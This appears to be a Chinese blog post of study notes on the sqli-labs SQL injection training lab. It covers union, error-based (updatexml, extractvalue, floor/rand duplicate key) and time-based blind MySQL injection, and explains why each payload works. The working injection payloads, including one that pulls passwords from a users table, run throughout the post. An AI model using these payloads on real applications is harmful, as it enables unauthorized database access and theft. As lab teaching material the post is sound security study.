<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,0x7365637572697479,0x73797 '||(<span class="keyword">SELECT</span> <span class="number">0x45576d74</span> <span class="keyword">WHERE</span> <span class="number">1206</span>=<span class="number">1206</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">5316</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x71707a7871</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(table_schema <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">54</span>) <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> table_schema <span class="keyword">IN</span> (<span class="number">0x696e666f726d6174696f6e5f736368656d61</span>,<span class="number">0x6d7973716c</span>,<span class="number">0x6d7973716c69</span>,<span class="number">0x706572666f726d616e63655f736368656d61</span>,<span class="number">0x7365637572697479</span>,<span class="number">0x737973</span>) <span class="keyword">LIMIT</span> <span class="number">39</span>,<span class="number">1</span>),<span class="number">0x7171627171</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a))||<span class="string">'3) LIMIT 39,1),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1') union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586499264221-8c1cfe72-41ce-4d39-80ef-9d0c35fb8024.png#align=left&display=inline&height=101&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=1803&size=38402&status=done&style=none&width=901.5" alt="image.png"></p>
<h1 id="less-2：Error-Based-Intiger"><a href="#less-2：Error-Based-Intiger" class="headerlink" title="less-2：Error Based- Intiger"></a>less-2：Error Based- Intiger</h1><h2 id="联合注-1"><a href="#联合注-1" class="headerlink" title="联合注"></a>联合注</h2><p><code>order by</code>定列数：3 列，回显 2，3 位置，直接用 group_concat 尝试取出所有数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0  UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>( column_name,<span class="number">0x20</span>) <span class="keyword">from</span> information_schema.columns</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586420151258-f3369495-a134-49e3-b852-5c83003e7679.png#align=left&display=inline&height=391&margin=%5Bobject%20Object%5D&name=image.png&originHeight=781&originWidth=1907&size=114837&status=done&style=none&width=953.5" alt="image.png"></p>
<h2 id="报错注-1"><a href="#报错注-1" class="headerlink" title="报错注"></a>报错注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://sqli.zuoxueba.org/Less-2/?id=1 and</span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>)))</span><br><span class="line"><span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x</span><br><span class="line"><span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>

<p>整型注入，不需要加单引号</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试</span></span><br><span class="line">1+and+case+when+(1=1)+then+sleep(1)+else+1+<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 出数据</span></span><br><span class="line"><span class="number">1</span>+<span class="keyword">and</span>+<span class="keyword">case</span>+<span class="keyword">when</span>+(<span class="keyword">left</span>((<span class="keyword">select</span>+<span class="keyword">version</span>()),<span class="number">1</span>)=<span class="string">'5'</span>)+<span class="keyword">then</span>+<span class="keyword">sleep</span>(<span class="number">1</span>)+<span class="keyword">else</span>+<span class="number">1</span>+<span class="keyword">end</span></span><br><span class="line">	- <span class="keyword">left</span>(<span class="keyword">str</span>,<span class="keyword">length</span>)</span><br><span class="line">  - <span class="keyword">substr</span>(<span class="keyword">str</span>,<span class="keyword">start</span>,[<span class="keyword">length</span>])</span><br><span class="line">  	+ <span class="keyword">start</span> 开始位置，默认是从<span class="number">1</span>开始</span><br><span class="line">    + <span class="keyword">length</span>是返回字符串的长度，不可为负数</span><br></pre></td></tr></table></figure>

<h1 id="less-1：Error-Based-String"><a href="#less-1：Error-Based-String" class="headerlink" title="less-1：Error Based- String"></a>less-1：Error Based- String</h1><h2 id="联合注-2"><a href="#联合注-2" class="headerlink" title="联合注"></a>联合注</h2><p>之所以<code>id=1</code>时，不出数据，是因为源码中 31 行的<code>**mysql_fetch_array()**</code>函数只取 1 行，</p>
<blockquote>
<p><strong>mysql_fetch_array</strong>() 函数从结果集中取得一行作为关联数组</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586286240874-ee453d74-bf47-4b77-8b5e-6ecdeeaa5cb6.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=266&originWidth=740&size=50404&status=done&style=none&width=370" alt="image.png"><br>假如直接执行<code>id=1</code>的话，是有两行结果的，我们想执行的查询在第 2 行，所以就拿不到结果。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586286614284-2d46cd91-aa37-4933-bd80-f0b0370db1a3.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=952&size=29725&status=done&style=none&width=476" alt="image.png"><br>因此，才需要让<code>id</code>等于一个不存在的值（如-1），使<code>mysql</code>只返回我们想要的查询结果.</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586286830896-64bed519-3b4e-4aab-9659-1652de1e3b94.png#align=left&display=inline&height=203&margin=%5Bobject%20Object%5D&name=image.png&originHeight=406&originWidth=936&size=25839&status=done&style=none&width=468" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586286876950-da58195a-4a74-4bb7-b37c-3c10fcd05889.png#align=left&display=inline&height=205&margin=%5Bobject%20Object%5D&name=image.png&originHeight=409&originWidth=1597&size=106234&status=done&style=none&width=798.5" alt="image.png"><br>此外，<code>1,2,3-- #</code>中，<code>-- #</code>的作用是注释掉后面的语句，<code>--</code>与<code>#</code>之间必须有一个空格，否则会报错。更正为如下</p>
<blockquote>
<p>注意：一定要在注释符号后加空格，或者 URL 编码后的空格（%20），否则注释符号不会产生作用。#号换成其它符号也可</p>
</blockquote>
<h2 id="报错注-2"><a href="#报错注-2" class="headerlink" title="报错注"></a>报错注</h2><p>参考资料</p>
<ul>
<li><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">十种 MySQL 报错注入</a></li>
</ul>
<p>可用的 payload 主要有以下几类</p>
<h3 id="XPATH-语法错误"><a href="#XPATH-语法错误" class="headerlink" title="XPATH 语法错误"></a>XPATH 语法错误</h3><p>报错信息是有长度限制的，在<code>mysql/my_error.c</code>中可以看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. *&#x2F;</span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure>

<h4 id="UpdateXml-1-QUERY-1"><a href="#UpdateXml-1-QUERY-1" class="headerlink" title="UpdateXml(1,(QUERY),1)"></a>UpdateXml(1,(QUERY),1)</h4><blockquote>
<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc<br>第二个参数：XPath_string *<em>(要求是 Xpath 格式的字符串) *</em>，如果不了解 Xpath 语法，可以在网上查找教程。<br>第三个参数：new_value，String 格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 and pdatexml(1,(QUERY),1)</span><br><span class="line">1 and 1=(updatexml(1,(QUERY),1))  //updatexml左右的括号可要可不要</span><br><span class="line"></span><br><span class="line">id=1' and '1'=(updatexml('2',concat('~',(<span class="keyword">select</span> @@basedir),<span class="string">'~'</span>),<span class="string">'2'</span>))<span class="comment">-- 1</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">0</span><span class="string">' and updatexml(2,concat('</span>~<span class="string">',(select version()),'</span>~<span class="string">'),2)-- 1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586288624828-52c2c0b3-992c-43a4-917e-cdbaad5d7bc6.png#align=left&display=inline&height=223&margin=%5Bobject%20Object%5D&name=image.png&originHeight=447&originWidth=1525&size=197231&status=done&style=none&width=762.5" alt="image.png"></p>
<h4 id="ExtractValue-1-QUERY"><a href="#ExtractValue-1-QUERY" class="headerlink" title="ExtractValue(1,(QUERY))"></a>ExtractValue(1,(QUERY))</h4><blockquote>
<p><a href="https://yq.aliyun.com/go/articleRenderRedirect?spm=a2c4e.11153940.0.0.34f261feypnf9U&url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue" target="_blank" rel="noopener"><code>ExtractValue(xml_frag, xpath_expr)</code></a> &gt; <a href="https://yq.aliyun.com/go/articleRenderRedirect?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue" target="_blank" rel="noopener"><code>ExtractValue()</code></a>接受两个字符串参数，一个 XML 标记片段 <em>xml_frag</em>和一个 XPath 表达式 <strong><em>xpath_expr</em></strong>（也称为 定位器）; 如果它存在语法错误，sql 就会把错误显示出来。</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586354275997-58cabcfa-f20c-47e3-89c0-6fca31b64ef2.png#align=left&display=inline&height=156&margin=%5Bobject%20Object%5D&name=image.png&originHeight=311&originWidth=1365&size=84535&status=done&style=none&width=682.5" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27%20and%20extractvalue(1,%20concat(0x5c,%20(<span class="keyword">select</span>%<span class="number">20</span>table_name%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">201</span>),%<span class="number">27</span>~%<span class="number">27</span>));<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure>

<h3 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h3><h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><blockquote>
<p>_  通过 floor 报错【没有任何字符长度限制】 需要数据表里有三条以上的数据_ &gt; <a href="https://xz.aliyun.com/t/253#toc-2" target="_blank" rel="noopener">https:/</a><a href="https://xz.aliyun.com/t/253#toc-2" target="_blank" rel="noopener">/xz.aliyun.com/t/253#toc-2</a></p>
</blockquote>
<p>先看一段常用的<code>payload</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span>( <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<p>主要是由于<code>count(*)</code>、<code>rand()</code> 、 <code>group by</code>  这三个函数连用造成的<strong>主键重复</strong>问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">floor(x) 函数，向下取整,返回一个不大于x的值</span><br><span class="line">round(x,d) 函数，根据四舍五入保留指定的小数位数，x指要处理的数，d是指保留几位小数。</span><br><span class="line">rand() 函数，产生一个0-1之间的随机浮点数，若有参数x，则返回一个x对应的固定的值</span><br></pre></td></tr></table></figure>

<p>首先，先看<code>floor(rand(0)*2))</code>，它是个开头为<code>0 1 1 0 1 1</code>的固定序列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><code>group by key</code>是对进行数据进行分组统计，效果如下图所示。很容易看清楚，它是不允许 key 值重复的（也就所下图中的 name 列），如果重复就会报错<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586409955539-b1006041-5c09-41b9-bee0-a7f10184fa95.png#align=left&display=inline&height=421&margin=%5Bobject%20Object%5D&name=image.png&originHeight=842&originWidth=877&size=74007&status=done&style=none&width=438.5" alt="image.png"><br>同时<code>group by</code>它的原理是循环读取数据的每一行，将结果保存于虚拟表中。这个虚拟表读取每一行的 key 时会有如下的逻辑：</p>
<ul>
<li>如果<strong>判断</strong>key 已存在于临时表中，<strong>不插入</strong>数据；</li>
<li>如果<strong>判断</strong>key 不在临时表中，则在临时表中<strong>插入</strong>当前行的数据</li>
</ul>
<p>刚刚说到，<code>floor(rand(0)*2)</code>这个值不是常量，是会在<code>0 1</code>这两个值中间变动的，这就导致<code>group by</code>在执行<strong>判断</strong>与<strong>插入</strong>这两个操作时，标准都已经变了！<del>（这一秒你以为我是 0，其实下一秒我就成了 1，没想到吧哈哈）</del><br>~~<br>此外，为何要在<code>payload</code>中用<code>x</code>和<code>a</code>来占位，实际上这是表的别名(<code>alias</code>)，等同于<code>as x</code>（下图有运行效果），在子查询中得用，不然会报这个错<code>Every derived table must have its own alias</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586354642583-bf8fc31a-6698-46c5-9878-931674632223.png#align=left&display=inline&height=182&margin=%5Bobject%20Object%5D&name=image.png&originHeight=364&originWidth=565&size=18845&status=done&style=none&width=282.5" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586354668898-70056c04-f192-4b86-b4eb-72c48ddb18e1.png#align=left&display=inline&height=175&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=642&size=20862&status=done&style=none&width=321" alt="image.png"></p>
<p><a href="https://xz.aliyun.com/t/253#toc-2" target="_blank" rel="noopener">MYSQL 报错注入的一点总结 - 先知社区</a></p>
<h3 id="大数溢出"><a href="#大数溢出" class="headerlink" title="大数溢出"></a>大数溢出</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一说在 mysql&gt;5.5.53 时，则不能返回查询结果<br>二说在版本号为 5.5.47 上可以用来注入，而在 5.7.17 上则不行：<br><a href="https://xz.aliyun.com/t/253#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/253#toc-4</a><br>总结：在高版本 mysql 上不可</p>
</blockquote>
<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><ul>
<li>distinct 去除重复项</li>
</ul>
<p><strong><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586353989124-f5a8bb4e-374d-4d36-8677-89869f68a1f0.png#align=left&display=inline&height=429&margin=%5Bobject%20Object%5D&name=image.png&originHeight=858&originWidth=839&size=48179&status=done&style=none&width=419.5" alt="image.png"></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>, (<span class="keyword">select</span> <span class="keyword">password</span>),<span class="number">0x7e</span>) <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>group_concat</code> 合并多行结果在一行显示, <code>group_concat</code>后可以不跟<code>group</code> by，但里面必须跟列名，而不能跟子查询</li>
<li>报错注入里，必须要用<code>concat(&quot;~&quot;, [QUERY] , &quot;~&quot;)</code>将其左边、右边字符串化，否则会导致回显不全</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586502391261-1de189fb-efe1-442f-a013-477a60f3ffd4.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=1646&size=30517&status=done&style=none&width=823" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586502428533-fc953746-ff26-4b14-b545-37e70f914275.png#align=left&display=inline&height=68&margin=%5Bobject%20Object%5D&name=image.png&originHeight=136&originWidth=1492&size=26395&status=done&style=none&width=746" alt="image.png"></p>
<ul>
<li><code>-- -</code>中在浏览器是空格，在 burp 里是加号<code>+</code></li>
</ul>
<h1 id="部署说明"><a href="#部署说明" class="headerlink" title="部署说明"></a>部署说明</h1><ul>
<li><a href="https://github.com/alecshan/sqli-labs-for-docker" target="_blank" rel="noopener">https://github.com/alecshan/sqli-labs-for-docker</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/14/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/16/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Unc1e</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%20%7C%7C%20archive">
              
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Unc1e</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
